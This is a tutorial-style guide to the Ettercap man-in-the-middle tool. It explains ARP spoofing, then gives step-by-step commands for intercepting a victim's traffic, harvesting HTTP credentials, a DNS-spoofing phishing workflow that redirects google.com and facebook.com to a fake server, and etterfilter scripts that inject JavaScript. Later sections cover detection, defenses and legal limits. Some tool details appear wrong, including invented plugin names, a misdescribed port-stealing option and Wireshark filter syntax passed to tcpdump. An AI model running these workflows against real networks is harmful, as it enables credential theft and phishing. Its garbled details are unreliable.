# ETTERCAP: A Comprehensive Guide to Man-in-the-Middle Attacks and Network Interception

## Table of Contents
1. [Introduction](#introduction)
2. [Network Interception Fundamentals](#network-interception-fundamentals)
3. [How ETTERCAP Works](#how-ettercap-works)
4. [Installation and Setup](#installation-and-setup)
5. [GUI Mode (GTK Interface)](#gui-mode-gtk-interface)
6. [Command-Line Usage](#command-line-usage)
7. [MITM Attack Methods](#mitm-attack-methods)
8. [Sniffing Modes](#sniffing-modes)
9. [Filtering and Content Modification](#filtering-and-content-modification)
10. [Plugins and Advanced Features](#plugins-and-advanced-features)
11. [Log Analysis](#log-analysis)
12. [Practical Examples and Workflows](#practical-examples-and-workflows)
13. [Detection and Defense](#detection-and-defense)
14. [Security and Ethical Considerations](#security-and-ethical-considerations)

---

## Introduction

**Ettercap** is a comprehensive suite for network packet sniffing and man-in-the-middle (MITM) attacks on LANs. It supports active and passive dissection of many protocols (even encrypted ones) and includes powerful filtering and content modification capabilities.

### Key Characteristics

- **Multipurpose Tool**: Sniffing, MITM attacks, content filtering, protocol dissection all in one
- **Multiple Interfaces**: GTK GUI, text console, curses interface, daemon mode
- **Flexible MITM Methods**: ARP spoofing, DNS spoofing, DHCP spoofing, port stealing, and more
- **Protocol Support**: Comprehensive protocol analysis (HTTP, FTP, SSH, Telnet, etc.)
- **Content Filtering**: Modify packets on-the-fly using etterfilter
- **Plugin Architecture**: Extensible with custom plugins
- **Sophisticated Logging**: Pcap format, text logging, log analysis tools
- **Dual-Stack**: IPv4 and IPv6 support
- **No Dependencies**: Minimal external requirements

### Primary Use Cases

- **Network Reconnaissance**: Passive sniffing to discover hosts and protocols
- **Credential Harvesting**: Extract passwords from unencrypted protocols
- **Protocol Analysis**: Dissect and understand network communication
- **Network Troubleshooting**: Monitor and debug traffic issues
- **Security Testing**: Authorized penetration testing
- **Lab Analysis**: Protocol behavior analysis in controlled environments
- **Traffic Manipulation**: Inject, modify, or drop packets
- **Forensics**: Capture and analyze network evidence

### Limitations

- **Local Network Only**: Only works on same network segment (LAN)
- **Easily Detected**: MITM attacks generate obvious ARP patterns
- **Encrypted Traffic**: Cannot easily break HTTPS/TLS
- **Not Stealth**: Modern networks detect ARP anomalies
- **Requires Root**: Must run with elevated privileges
- **Maintenance Overhead**: Manual configuration for complex scenarios

---

## Network Interception Fundamentals

### ARP (Address Resolution Protocol)

**Purpose**: Map IPv4 addresses to MAC (hardware) addresses on a LAN.

**How ARP Works**:

1. **ARP Request**: "Who has 192.168.1.1?"
   ```
   Sender IP: 192.168.1.100
   Target IP: 192.168.1.1
   Sent to: ff:ff:ff:ff:ff:ff (broadcast MAC)
   ```

2. **ARP Response**: "I have 192.168.1.1, my MAC is 00:11:22:33:44:55"
   ```
   Sender IP: 192.168.1.1
   Sender MAC: 00:11:22:33:44:55
   Target IP: 192.168.1.100
   Sent to: requesting MAC (unicast)
   ```

3. **ARP Caching**: Victim stores mapping in ARP cache
   ```
   192.168.1.1 → 00:11:22:33:44:55 (expires in ~20 minutes)
   ```

### ARP Spoofing (ARP Poisoning)

**Attack Concept**:

Instead of legitimate ARP responses, attacker sends fake responses:

```
NORMAL SCENARIO:
┌──────────┐           ┌──────────┐           ┌─────────┐
│  Victim  │←─────────→│ Attacker │←─────────→│ Router  │
│192.168.1.100        192.168.1.10          192.168.1.1
└──────────┘           └──────────┘           └─────────┘
ARP Cache:              (attacker)            ARP Cache:
Router=aa:aa:aa...                           Victim=cc:cc:cc...

AFTER ARP SPOOFING BY ATTACKER:
┌──────────┐          ┌──────────┐           ┌─────────┐
│  Victim  │          │ Attacker │           │ Router  │
│ thinks   │←────────→│  (MITM)  │←────────→│  thinks │
│ this is  │          │          │           │  this is│
│ router   │          │ (real)   │           │ victim  │
└──────────┘          └──────────┘           └─────────┘
ARP Cache:            All traffic            ARP Cache:
Router=bb:bb:bb...    passes through         Victim=bb:bb:bb...

Victim's ARP: 192.168.1.1 → bb:bb:bb:bb:bb:bb (attacker's MAC)
Router's ARP: 192.168.1.100 → bb:bb:bb:bb:bb:bb (attacker's MAC)
```

### MITM Positioning

```
LEGITIMATE FLOW:
Victim → [packet] → Router → [packet] → Internet

MITM FLOW:
Victim → [packet] → Attacker → [reads/modifies] → Router → [packet] → Internet
Router → [packet] → Attacker → [reads/modifies] → Victim → [packet] → Application

Attacker can:
✓ Read all traffic
✓ Modify packets before forwarding
✓ Drop packets
✓ Inject new packets
✓ Capture credentials
✓ Redirect connections
```

### Why ARP Spoofing Works

1. **Stateless Protocol**: ARP doesn't authenticate responses
2. **Dynamic Updates**: Systems accept ARP updates even without requests
3. **No Encryption**: ARP operates below encryption
4. **Trust Model**: Systems trust ARP responses on LAN
5. **Broadcast Nature**: Easy to spoof responses to all machines

---

## How ETTERCAP Works

### Architecture

```
┌──────────────────────────────────────────────────────┐
│ ETTERCAP Main Process                                │
├──────────────────────────────────────────────────────┤
│                                                      │
│  ┌─────────────────────────────────────────────┐    │
│  │ MITM Module                                 │    │
│  ├─────────────────────────────────────────────┤    │
│  │ - ARP Spoofing                              │    │
│  │ - DHCP Spoofing                             │    │
│  │ - DNS Spoofing                              │    │
│  │ - Port Stealing                             │    │
│  │ - ICMP Redirect                             │    │
│  └─────────────────────────────────────────────┘    │
│                                                      │
│  ┌─────────────────────────────────────────────┐    │
│  │ Sniffing Engine                             │    │
│  ├─────────────────────────────────────────────┤    │
│  │ - Packet Capture (libpcap)                  │    │
│  │ - Protocol Dissection                       │    │
│  │ - Connection Tracking                       │    │
│  └─────────────────────────────────────────────┘    │
│                                                      │
│  ┌─────────────────────────────────────────────┐    │
│  │ Content Filter Engine                       │    │
│  ├─────────────────────────────────────────────┤    │
│  │ - Packet Matching (etterfilter)             │    │
│  │ - Payload Modification                      │    │
│  │ - Packet Injection                          │    │
│  └─────────────────────────────────────────────┘    │
│                                                      │
│  ┌─────────────────────────────────────────────┐    │
│  │ Logging & Analysis                          │    │
│  ├─────────────────────────────────────────────┤    │
│  │ - PCAP File Writing                         │    │
│  │ - Text Logging                              │    │
│  │ - Password Extraction                       │    │
│  │ - Credential Storage                        │    │
│  └─────────────────────────────────────────────┘    │
│                                                      │
│  ┌─────────────────────────────────────────────┐    │
│  │ Plugin System                               │    │
│  ├─────────────────────────────────────────────┤    │
│  │ - Hook plugins (run during sniffing)        │    │
│  │ - Standalone plugins (protocol decoders)    │    │
│  │ - Custom protocol handlers                  │    │
│  └─────────────────────────────────────────────┘    │
│                                                      │
│  ┌─────────────────────────────────────────────┐    │
│  │ User Interface                              │    │
│  ├─────────────────────────────────────────────┤    │
│  │ - GTK GUI (graphical)                       │    │
│  │ - Curses Console (text-based)               │    │
│  │ - Text Mode (minimal)                       │    │
│  │ - Daemon (headless)                         │    │
│  └─────────────────────────────────────────────┘    │
│                                                      │
└──────────────────────────────────────────────────────┘
         │
         ├─ Libpcap (packet capture)
         ├─ Libnet (packet injection)
         └─ Kernel interfaces (for packet forwarding)
```

### Operational Flow

```
START ETTERCAP
  ↓
[1] INTERFACE SELECTION
    └─ Listen on eth0/wlan0
  ↓
[2] HOST SCANNING
    └─ ARP scan to discover live hosts
  ↓
[3] TARGET SELECTION
    └─ Select victim(s) and gateway
  ↓
[4] ARP SPOOFING STARTUP
    └─ Start sending fake ARP replies:
       - Tell victim: "I'm the router"
       - Tell router: "I'm the victim"
  ↓
[5] TRAFFIC INTERCEPTION
    ├─ Receive packets destined for victim
    ├─ Receive packets destined for router
    ├─ Apply content filters (if configured)
    └─ Forward packets to real destination
  ↓
[6] PROTOCOL DISSECTION
    └─ Analyze protocols in forwarded traffic:
       - HTTP (extract passwords, URLs)
       - FTP (extract credentials)
       - DNS (capture queries)
       - etc.
  ↓
[7] LOGGING & EXTRACTION
    ├─ Write PCAP file
    ├─ Log credentials
    ├─ Extract usernames/passwords
    └─ Display in real-time
  ↓
[8] CONTINUOUS OPERATION
    └─ While running:
       - Continuously resend spoofed ARP
       - Keep victim thinking attacker is router
       - Keep router thinking attacker is victim
  ↓
[9] CLEANUP ON EXIT
    └─ Send corrective ARP packets:
       - Tell victim: "Here's the real router's MAC"
       - Tell router: "Here's the real victim's MAC"
       - Restore normal ARP tables
```

### Why MITM Works in Practice

1. **ARP Lack of Authentication**: No verification of ARP responses
2. **Continuous ARP Updates**: Victim accepts new ARP responses
3. **Transparent Forwarding**: Victim doesn't notice traffic is being redirected
4. **Same Network Segment**: Attacker must be on same LAN
5. **Default Gateway Trust**: Systems trust ARP for default gateway
6. **Kernel Forwarding**: Linux kernel forwards packets between interfaces

---

## Installation and Setup

### Linux Installation

**Ubuntu/Debian**:

```bash
sudo apt update
sudo apt install ettercap-graphical ettercap-common
```

Or command-line version only:

```bash
sudo apt install ettercap-text-only
```

**Fedora/RHEL/CentOS**:

```bash
sudo dnf install ettercap
```

**Arch Linux**:

```bash
sudo pacman -S ettercap
```

**Kali Linux** (pre-installed):

```bash
ettercap --version    # Already available
```

### macOS Installation

```bash
brew install ettercap
```

### From Source

```bash
git clone https://github.com/Ettercap/ettercap.git
cd ettercap
mkdir build
cd build
cmake ..
make
sudo make install
```

### Verification

```bash
# Check version
ettercap --version

# List available network interfaces
ettercap -I

# Test GUI
sudo ettercap -G
```

### Dependencies

```bash
# Required libraries
- libpcap (packet capture)
- libnet (packet injection)
- GTK+ 3 (for GUI)
- ncurses (for console mode)
```

---

## GUI Mode (GTK Interface)

### Starting Ettercap GUI

```bash
sudo ettercap -G
```

### Interface Overview

```
┌────────────────────────────────────────────────────────────┐
│ ETTERCAP 0.8.3 - Man in the middle attacks                │
├────────────────────────────────────────────────────────────┤
│                                                            │
│ Toolbar:                                                   │
│ [≡] Menu  [Host List]  [Current Connections] [Interfaces] │
│ [🔍] Scan  [✓ Start]  [⊘ Stop]  [!] Sniff                │
│                                                            │
├────────────────────────────────────────────────────────────┤
│                                                            │
│ Host List:                                                 │
│ ┌────────────────────────────────────────────────────────┐│
│ │IP Address      | Hostname          | MAC Address       ││
│ │192.168.1.1    | router.local      | aa:bb:cc:dd:ee:01││
│ │192.168.1.10   | laptop            | 11:22:33:44:55:66││
│ │192.168.1.20   | desktop           | aa:aa:aa:aa:aa:aa││
│ │192.168.1.30   | printer           | bb:bb:bb:bb:bb:bb││
│ └────────────────────────────────────────────────────────┘│
│                                                            │
│ Packet Display Area:                                      │
│ ┌────────────────────────────────────────────────────────┐│
│ │[10:23:45] HTTP: admin → GET /admin/panel              ││
│ │[10:23:46] HTTP: admin → USER: admin PASS: secret123   ││
│ │[10:23:47] FTP: user login attempt                      ││
│ │[10:23:48] DNS: Query for malware.com                  ││
│ └────────────────────────────────────────────────────────┘│
│                                                            │
│ Status Bar: "Sniffing in progress: 152 packets captured" │
└────────────────────────────────────────────────────────────┘
```

### Step-by-Step GUI Workflow

**Step 1: Select Interface**

- Top menu: **Sniff** → **Unified sniffing**
- Select network interface (eth0, wlan0, etc.)
- Click "OK"

**Step 2: Scan for Hosts**

- Click magnifying glass icon or **Hosts** → **Scan for hosts**
- Wait for ARP scan to complete
- Hosts appear in host list with IP, hostname, MAC

**Step 3: Select Targets**

- Click first target (victim IP)
- Click on target → **Add to Target 1**
- Click second target (gateway IP)
- Click on target → **Add to Target 2**

Alternative: Right-click target → **Target 1** or **Target 2**

**Step 4: Start MITM**

- Menu: **MITM** → **ARP Spoofing**
- In popup: Check "Sniff remote traffic"
- Click "OK"

**Step 5: Start Sniffing**

- Click green **Start** button or **Sniff** → **Start**
- Monitor packet display for captured credentials

**Step 6: Stop Attack**

- Click red **Stop** button or **Sniff** → **Stop**
- Ettercap sends corrective ARP packets
- Network returns to normal

### Advanced GUI Options

**Sniffing Modes**:
- **Sniff** → **Unified sniffing** (both directions)
- **Sniff** → **Bridged sniffing** (two interfaces)
- **Sniff** → **From pcap file** (replay capture)

**Plugins**:
- **Plugins** → Browse available plugins
- Enable plugins like dns_spoof, HTTP interception, etc.

**Filters**:
- **Filters** → Load custom content filter
- Modify packets on-the-fly

---

## Command-Line Usage

### Basic Syntax

```bash
ettercap [options] [TARGET1] [TARGET2]
```

### Target Specification Format

```
MAC/IP/IPv6/PORTs

Examples:
- 192.168.1.1        # Single IP
- 192.168.1.0/24     # Network range
- 192.168.1.100-150  # IP range
- 00:11:22:33:44:55  # MAC address
- 192.168.1.1/80     # IP with port
- 192.168.1.1,192.168.1.100/80  # Combined
```

### Essential Options

| Option | Purpose |
|--------|---------|
| `-G` | GTK GUI mode |
| `-C` | Curses (text console) mode |
| `-T` | Text-only mode |
| `-D` | Daemon mode (headless) |
| `-i iface` | Specify network interface |
| `-M mitm_method` | MITM attack method |
| `-P plugin` | Load plugin |
| `-F filter` | Load content filter |
| `-w file` | Write PCAP file |
| `-L logfile` | Log to file |
| `-d` | DNS resolution |
| `-q` | Quiet (no packet display) |
| `-z` | Don't perform initial ARP scan |

---

## MITM Attack Methods

### 1. ARP Spoofing (Most Common)

```bash
# Basic ARP spoofing
sudo ettercap -G -M arp:remote /192.168.1.1// /192.168.1.100//

# Via command line (text mode)
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -w capture.pcap

# With only MITM (no sniffing)
sudo ettercap -u -M arp:remote /192.168.1.1// /192.168.1.100//
```

**Format Explanation**:
- `/192.168.1.1//` = Router (Target 2, gateway)
- `/192.168.1.100//` = Victim (Target 1)
- Empty slashes `//` = all ports

### 2. DNS Spoofing

**DNS Poisoning**:

```bash
# Using dns_spoof plugin
sudo ettercap -G -P dns_spoof /192.168.1.1//
```

Requires editing `/etc/ettercap/etter.dns` to define spoofed domains:

```
# etter.dns format:
# example.com A 192.168.1.10
# www.example.com A 192.168.1.10

*.example.com A 192.168.1.10        # All subdomains to 192.168.1.10
badsite.com A 127.0.0.1            # Redirect to localhost
google.com A 192.168.1.10           # Redirect Google
```

### 3. DHCP Spoofing

```bash
# Using dhcp_spoof plugin
sudo ettercap -G -P dhcp_spoof
```

Assign fake gateway/DNS to DHCP clients.

### 4. ICMP Redirect

```bash
sudo ettercap -M icmp:remote /192.168.1.1// /192.168.1.100//
```

Tricks victim to route through attacker.

### 5. Port Stealing

```bash
sudo ettercap -M port:80,443 /192.168.1.1// /192.168.1.100//
```

Intercepts only specific ports (more stealthy).

---

## Sniffing Modes

### 1. Unified Sniffing (Default)

Sniff all traffic on single interface:

```bash
sudo ettercap -G
# Then: Sniff → Unified sniffing → Select interface
```

### 2. Bridged Sniffing

Uses two network interfaces to forward all traffic:

```bash
sudo ettercap -B eth0 -G   # Forward traffic between eth0 and default interface
```

**Use Case**: Connect two networks, intercept all traffic.

### 3. IP-Based Sniffing

Sniff only traffic to/from specific IP:

```bash
sudo ettercap -G /192.168.1.100//
```

### 4. MAC-Based Sniffing

Sniff by MAC address:

```bash
sudo ettercap -G /00:11:22:33:44:55//
```

### 5. Port-Based Sniffing

Sniff only specific ports:

```bash
sudo ettercap -G /192.168.1.100/80,443/   # Only HTTP/HTTPS
```

---

## Filtering and Content Modification

### Etterfilter Syntax

Create file: `myfilter.ecf`

```
# Comment - ignored
# Match HTTP GET requests
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "GET")) {
        # Drop the packet
        drop();
        
        # Kill the connection
        kill();
    }
}

# Replace text in payload
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "password")) {
        # Replace 'password' with 'p@ssw0rd'
        replace("password", "p@ssw0rd");
    }
}

# Inject payload
if (ip.proto == TCP && tcp.dst == 80) {
    inject("<script>alert('Hacked!');</script>");
}
```

### Compile Filter

```bash
# Compile to binary format
etterfilter -o myfilter.ef myfilter.ecf

# Test filter
etterfilter -t myfilter.ecf

# With debug info
etterfilter -d -o myfilter.ef myfilter.ecf
```

### Load and Use Filter

```bash
# In GUI: Filters → Load filter → select .ef file

# Via command line:
sudo ettercap -G -F myfilter.ef

# Text mode:
sudo ettercap -T -F myfilter.ef /192.168.1.1// /192.168.1.100//
```

### Common Filter Functions

| Function | Purpose | Example |
|----------|---------|---------|
| `search()` | Find string in packet | `search(DATA.data, "password")` |
| `replace()` | Replace text | `replace("old", "new")` |
| `inject()` | Insert data | `inject("<payload>")` |
| `drop()` | Discard packet | `drop()` |
| `kill()` | Kill connection | `kill()` |
| `log()` | Write to log | `log("Found: " + DATA.data)` |

---

## Plugins and Advanced Features

### Available Plugins

**Credential Harvesting**:
- `http_dissector` - Extract HTTP credentials
- `ftp_dissector` - Capture FTP logins
- `sniffer` - General sniffing

**DNS Manipulation**:
- `dns_spoof` - Poison DNS responses
- `dns_query_filter` - Filter DNS queries

**Spoofing**:
- `dhcp_spoof` - DHCP spoofing
- `port_steal` - Steal specific ports
- `icmp_redirect` - ICMP redirect attacks

**Analysis**:
- `ssh_ciphers` - Analyze SSH negotiation
- `sslstrip` - SSL downgrade attacks (old version)

### Loading Plugins

**GUI Mode**:
```
Plugins → [List of available plugins] → Enable/Disable
```

**Command Line**:
```bash
# Single plugin
sudo ettercap -G -P dns_spoof

# Multiple plugins
sudo ettercap -G -P dns_spoof -P http_dissector

# Or use plugin-list
sudo ettercap -G --plugin-list dns_spoof,http_dissector
```

### Using http_dissector Plugin

Captures HTTP credentials:

```bash
sudo ettercap -T -P http_dissector /192.168.1.1// /192.168.1.100//
```

**Output Example**:
```
[10:23:46] HTTP: 192.168.1.100 → POST /login.php
    USER: admin
    PASS: SecurePassword123
    REFER: http://example.com/login
```

### Using dns_spoof Plugin

Poison DNS to redirect traffic:

1. **Edit** `/etc/ettercap/etter.dns`:
   ```
   google.com A 192.168.1.10
   facebook.com A 192.168.1.10
   ```

2. **Run Ettercap**:
   ```bash
   sudo ettercap -G -P dns_spoof
   ```

3. **Victims** typing "google.com" connect to fake server on 192.168.1.10

---

## Log Analysis

### Logging Options

```bash
# Log to text file
sudo ettercap -L logfile.txt

# Log info only (no packets)
sudo ettercap -l infofile.txt

# Log messages
sudo ettercap -m messagefile.txt

# PCAP format
sudo ettercap -w capture.pcap

# Compressed PCAP
sudo ettercap -w capture.pcap -c
```

### Etterlog Tool

Analyze captured logs:

```bash
# List connections
etterlog -c logfile.txt

# Filter by IP
etterlog -f 192.168.1.100 logfile.txt

# Extract passwords
etterlog -p logfile.txt

# Search by user
etterlog -u admin logfile.txt

# Convert to different formats
etterlog -A logfile.txt    # ASCII
etterlog -H logfile.txt    # HTML
etterlog -X logfile.txt    # HEX
etterlog -E logfile.txt    # EBCDIC
```

### Analyzing PCAP Files

```bash
# With Wireshark
wireshark capture.pcap

# With tcpdump
tcpdump -r capture.pcap -n

# Filter specific traffic
tcpdump -r capture.pcap -n 'tcp.port==80'
```

---

## Practical Examples and Workflows

### Example 1: Basic Network Reconnaissance

Discover all hosts and their services:

```bash
sudo ettercap -G

# In GUI:
# 1. Sniff > Unified Sniffing > select eth0
# 2. Hosts > Scan for hosts
# 3. Observe host list with IPs and services
# 4. View → Hosts List to see details
```

### Example 2: Credential Harvesting (HTTP)

Capture HTTP login credentials:

```bash
# Target: Router 192.168.1.1, Victim 192.168.1.100
sudo ettercap -T -P http_dissector \
  -M arp:remote \
  -w capture.pcap \
  -L credentials.log \
  /192.168.1.1// /192.168.1.100//

# Monitor output for captured credentials
```

### Example 3: DNS Spoofing Phishing

Redirect victim to fake site:

```bash
# 1. Edit /etc/ettercap/etter.dns
echo "google.com A 192.168.1.10" >> /etc/ettercap/etter.dns
echo "facebook.com A 192.168.1.10" >> /etc/ettercap/etter.dns

# 2. Set up web server on 192.168.1.10 with fake site

# 3. Run ettercap with dns_spoof
sudo ettercap -G -P dns_spoof \
  -M arp:remote \
  /192.168.1.1// /192.168.1.100//

# 4. Victim visiting google.com gets fake site
```

### Example 4: Content Injection

Inject JavaScript into HTTP traffic:

```bash
# 1. Create filter file: inject.ecf
cat > inject.ecf << 'EOF'
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "HTTP/1")) {
        inject("<script>alert('Your connection hijacked!');</script>");
    }
}
EOF

# 2. Compile filter
etterfilter inject.ecf -o inject.ef

# 3. Run ettercap with filter
sudo ettercap -T -F inject.ef \
  -M arp:remote \
  /192.168.1.1// /192.168.1.100//
```

### Example 5: Packet Modification

Replace text in HTTP responses:

```bash
# Create filter: modify.ecf
cat > modify.ecf << 'EOF'
# Replace all mentions of "Google" with "Hacked"
if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "Google")) {
        replace("Google", "HACKED");
    }
}
EOF

# Compile and run
etterfilter modify.ecf -o modify.ef
sudo ettercap -T -F modify.ef \
  -M arp:remote \
  /192.168.1.1// /192.168.1.100//
```

### Example 6: Network-Wide Sniffing

Capture traffic from all hosts:

```bash
# MITM between router and all clients
sudo ettercap -T -P http_dissector \
  -M arp:remote \
  -w all_traffic.pcap \
  /192.168.1.1// /192.168.1.0/24

# Intercepts all client-router traffic
```

### Example 7: Selective Port Interception

Only intercept HTTPS traffic:

```bash
sudo ettercap -T -P http_dissector \
  -M port:443 \
  /192.168.1.1// /192.168.1.100//

# Less detectable (doesn't spoof all ARP)
```

---

## Detection and Defense

### Detection Methods

**ARP Anomalies**:

```bash
# Check for suspicious ARP activity
sudo arp-watch
sudo arpwatch -d

# Manual ARP inspection
arp -a
# Look for duplicate IPs or rapid MAC changes
```

**Network Monitoring**:

```bash
# Monitor unusual ARP traffic
sudo tcpdump 'arp'

# Look for suspicious patterns:
# - Same MAC responding for multiple IPs
# - Rapid ARP updates without requests
# - ARP gratuitous announcements
```

**IDS/IPS Detection**:

- Suricata, Snort detect MITM patterns
- High ARP traffic triggers alerts
- Multiple ARP requests from same source suspicious

### Defense Mechanisms

**Static ARP Entries**:

```bash
# Linux
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:01

# Persistent in /etc/ethers
192.168.1.1 aa:bb:cc:dd:ee:01
192.168.1.2 aa:bb:cc:dd:ee:02
```

**VLAN Segmentation**:

- Separate critical systems
- Limit MITM scope
- Attacker must be on target VLAN

**Encrypted Communications**:

- Use HTTPS/TLS (blocks credential theft)
- Use VPN (encrypts all traffic)
- Use SSH instead of Telnet/FTP

**Network Monitoring Tools**:

- Wireshark (passive monitoring)
- Zeek/Snort (IDS/IPS)
- ARP Watch (dedicated ARP monitoring)

**Switch Security Features**:

- Port security (limit MAC per port)
- DHCP snooping
- Dynamic ARP Inspection (DAI)
- 802.1X (port-based authentication)

---

## Security and Ethical Considerations

### Legal and Ethical Issues

**MITM Attacks Are Illegal Without Authorization**:

- Unauthorized network interception (felony in most jurisdictions)
- Privacy violations
- Data theft
- Computer fraud

**Authorized Use Only**:

✓ **Legal Scenarios:**
- Authorized penetration testing (written agreement)
- Lab/test environments (own network)
- Network troubleshooting (with permission)
- Security research (with consent)

✗ **Illegal Scenarios:**
- Capturing others' traffic without permission
- Harvesting credentials
- Modifying network traffic
- Unauthorized MITM on public networks

### Responsible Pentesting with Ettercap

1. **Get Written Authorization**: Signed rules of engagement
2. **Define Scope**: Which systems/networks in scope
3. **Notify Stakeholders**: Inform relevant parties
4. **Document Everything**: Keep detailed logs
5. **Minimize Impact**: Don't disrupt operations
6. **Secure Results**: Protect captured data
7. **Clean Up**: Restore normal network state
8. **Provide Report**: Document findings and recommendations

### Ettercap in Corporate Environment

- **Lab Testing**: Test defenses in isolated networks
- **Red Team Exercises**: Authorized security assessments
- **Incident Response**: Investigate suspected MITM
- **Security Awareness**: Train staff on risks
- **Vulnerability Assessment**: Identify weak network security

### Detecting Ettercap Usage

Attackers targeting your network:

```bash
# Monitor for:
# - ARP spoofing patterns
# - Unusual network traffic
# - Failed connection attempts
# - Sudden latency increases
# - Unexpected MITM-like symptoms

# Tools to detect:
- arpwatch (monitor ARP)
- wireshark (traffic analysis)
- zeek (network monitoring)
- suricata (IDS)
```

---

## Summary and Best Practices

### Key Capabilities

1. **MITM Attacks**: ARP, DNS, DHCP, port stealing
2. **Passive Sniffing**: Monitor without intervention
3. **Active Content Modification**: Inject, replace, drop packets
4. **Credential Harvesting**: Extract usernames/passwords
5. **Protocol Analysis**: Dissect dozens of protocols
6. **Logging**: PCAP, text, compressed formats
7. **Plugin Architecture**: Extend functionality
8. **Flexible Filtering**: Content-based packet manipulation

### When Ettercap is Useful

✓ **Legitimate Uses:**
- Network troubleshooting
- Authorized security testing
- Protocol analysis/learning
- Lab environment testing
- Network monitoring (with permission)
- Vulnerability assessment (authorized)

✗ **Inappropriate Uses:**
- Unauthorized network monitoring
- Credential theft
- Traffic manipulation without permission
- Competitive intelligence
- Criminal activity

### Best Practices

1. **Always Get Authorization**: Written approval required
2. **Test in Lab First**: Practice on test networks
3. **Understand ARP**: Know what you're doing
4. **Monitor Network**: Watch for detection
5. **Secure Captured Data**: Protect credentials
6. **Document Findings**: Detailed reports
7. **Restore Network**: Clean up after testing
8. **Educate Stakeholders**: Explain risks and findings
9. **Use Encryption**: Implement HTTPS/TLS
10. **Monitor Defenses**: Check for MITM indicators

### Typical Penetration Test Workflow

```
1. Reconnaissance
   └─ Passive sniffing to map network

2. Target Selection
   └─ Identify high-value targets

3. MITM Setup
   └─ ARP spoofing between target and gateway

4. Passive Harvesting
   └─ Capture credentials over HTTP

5. Active Testing
   └─ Content injection, DNS spoofing

6. Analysis
   └─ Review captured data for vulnerabilities

7. Reporting
   └─ Document findings and recommendations

8. Cleanup
   └─ Send corrective ARP, restore network
```

### Next Steps

- Practice in isolated lab environment
- Learn ARP and network fundamentals
- Study protocol dissection
- Develop custom filters
- Understand network defenses
- Get authorized to test real networks
- Document all testing activities
- Communicate findings professionally
